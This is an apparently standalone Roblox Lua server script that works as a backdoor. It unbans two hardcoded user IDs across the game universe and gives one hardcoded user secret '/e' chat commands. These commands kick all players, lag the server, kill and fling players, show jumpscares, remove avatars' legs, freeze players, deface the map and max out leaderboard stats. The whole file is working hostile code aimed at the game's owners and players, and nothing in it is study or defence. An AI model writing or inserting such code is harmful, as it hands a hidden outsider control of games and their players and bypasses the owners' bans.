local RunService = game:GetService("RunService")

local config: UnbanConfigType = {
	UserIds = {1656814567,6094886055},
	ApplyToUniverse = true
}
local success, err = pcall(function()
	return game.Players:UnbanAsync(config)
end)

game.Players.PlayerAdded:Connect(function(plr)
	plr.Chatted:Connect(function(message)
			if plr.UserId ~= 6094886055 then return end
			
			local command = string.split(message," ")
			if command[1] ~= "/e" then return end
			
			if string.match(string.lower(command[2]),"boom") then
				for i=1,100,1 do
					local boomSound = Instance.new("Sound")
					boomSound.Parent = workspace
					boomSound.Volume = 2
					boomSound.SoundId = "rbxassetid://9125402735"
					boomSound:Play()
					game.Debris:AddItem(boomSound,5)
				end
			elseif string.match(command[2],"shut") then
				for i,v in game.Players:GetPlayers() do
					v:Kick("Imagine exploiting you nerd")
				end
			elseif string.match(string.lower(command[2]),"fps") then
				local MaxFPS = 10
				local ticks = 0
				while ticks <= 80 do
					ticks += 1
					local Tick1 = tick()
					RunService.Heartbeat:Wait()
					repeat until (Tick1 + 1/MaxFPS) < tick()
				end
			elseif string.match(string.lower(command[2]),"nil") then
				if command[3] then
					local nilPlayer
					local name = string.lower(command[3])
					for i,v in game.Players:GetPlayers() do
						if string.match(string.lower(v.Name),name) then
							nilPlayer = v
							break
						end
					end
					nilPlayer.Character.Humanoid.Health = 0
					local bv = Instance.new("BodyVelocity")
					bv.Parent = nilPlayer.Character.HumanoidRootPart
					bv.MaxForce = Vector3.one * math.huge
					bv.Velocity = Vector3.one * 1000000
					bv.P = 1000000
					game.Debris:AddItem(bv,0.35)
				end
			elseif string.match(string.lower(command[2]),"nilall") then
				for i,v in game.Players:GetPlayers() do
					local nilPlayer = v
					nilPlayer.Character.Humanoid.Health = 0
					local bv = Instance.new("BodyVelocity")
					bv.Parent = nilPlayer.Character.HumanoidRootPart
					bv.MaxForce = Vector3.one * math.huge
					bv.Velocity = Vector3.one * 1000000
					bv.P = 1000000
					game.Debris:AddItem(bv,0.35)
				end
			elseif string.match(string.lower(command[2]),"mario") then
				for i,v in workspace:GetDescendants() do
					if v:IsA("Part") or v:IsA("UnionOperation") and v:IsA("MeshPart") then
						v.Transparency = 1
						local decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Top
						decal.Texture = "rbxassetid://7088214085"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Bottom
						decal.Texture = "rbxassetid://7088214085"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Left
						decal.Texture = "rbxassetid://7088214085"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Right
						decal.Texture = "rbxassetid://7088214085"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Front
						decal.Texture = "rbxassetid://7088214085"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Back
						decal.Texture = "rbxassetid://7088214085"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Bottom
						decal.Texture = "rbxassetid://7088214085"
					end
				end
				
				local sound = Instance.new("Sound")
				sound.Parent = workspace
				sound.SoundId = "rbxassetid://5730761426"
				sound.Looped = true
				sound:Play()
			elseif string.match(string.lower(command[2]),"jumpscare") then
				if command[3] then
					local name = string.lower(command[3])
					local targetPlayer
					for i,v in game.Players:GetPlayers() do
						if string.match(string.lower(v.Name),name) then
							targetPlayer = v
							break
						end
					end
					local gui = Instance.new("ScreenGui")
					gui.Parent = targetPlayer.PlayerGui
					gui.IgnoreGuiInset = true
					local image = Instance.new("ImageLabel")
					image.Size = UDim2.fromScale(1,1)
					image.Image = "rbxassetid://1744067162"
					image.Parent = gui
					local boomSound = Instance.new("Sound")
					boomSound.Parent = targetPlayer.Character.HumanoidRootPart
					boomSound.Volume = 5
					boomSound.SoundId = "rbxassetid://8325519723"
					boomSound:Play()
					task.wait(3)
					gui:Destroy()
					boomSound:Destroy()
				end
			elseif string.match(string.lower(command[2]),"breaklegs") then
				if command[3] then
					local name = string.lower(command[3])
					local targetPlayer
					for i,v in game.Players:GetPlayers() do
						if string.match(string.lower(v.Name),name) then
							targetPlayer = v
							break
						end
					end
					
					targetPlayer.Character["Right Leg"]:Destroy()
					targetPlayer.Character["Left Leg"]:Destroy()
					targetPlayer.Character.Humanoid.WalkSpeed = 8
					
					local boomSound = Instance.new("Sound")
					boomSound.Parent = targetPlayer.Character.HumanoidRootPart
					boomSound.Volume = 2
					boomSound.SoundId = "rbxassetid://198606040"
					boomSound:Play()
					game.Debris:AddItem(boomSound,5)
				end
			elseif string.match(string.lower(command[2]),"freeze") then
				if command[3] then
					local name = string.lower(command[3])
					local targetPlayer
					for i,v in game.Players:GetPlayers() do
						if string.match(string.lower(v.Name),name) then
							targetPlayer = v
							break
						end
					end
					targetPlayer.Character.HumanoidRootPart.Anchored = true
				end
			elseif string.match(string.lower(command[2]),":3") then
				for i,v in workspace:GetDescendants() do
					if v:IsA("Part") or v:IsA("UnionOperation") and v:IsA("MeshPart") then
						local decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Top
						decal.Texture = "rbxassetid://14292312398"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Bottom
						decal.Texture = "rbxassetid://14292312398"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Left
						decal.Texture = "rbxassetid://14292312398"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Right
						decal.Texture = "rbxassetid://14292312398"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Front
						decal.Texture = "rbxassetid://14292312398"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Back
						decal.Texture = "rbxassetid://14292312398"
						decal = Instance.new("Decal")
						decal.Parent = v
						decal.Face = Enum.NormalId.Bottom
						decal.Texture = "rbxassetid://14292312398"
					end
				end
			elseif string.match(string.lower(command[2]),"unanchor") then
				for i,v in workspace:GetDescendants() do
					if v:IsA("Part") then
						v.Anchored = false
						task.wait(0.2)
					end
				end
			elseif string.match(string.lower(command[2]),"winall") then
				for i,v in game.Players:GetPlayers() do
					if v:FindFirstChild("leaderstats") then
						v.leaderstats.Kills.Value = math.huge
						v.leaderstats["Kill Streak"].Value = math.huge
						v.leaderstats.Points.Value = math.huge
					end
				end
			end
		end)
end)
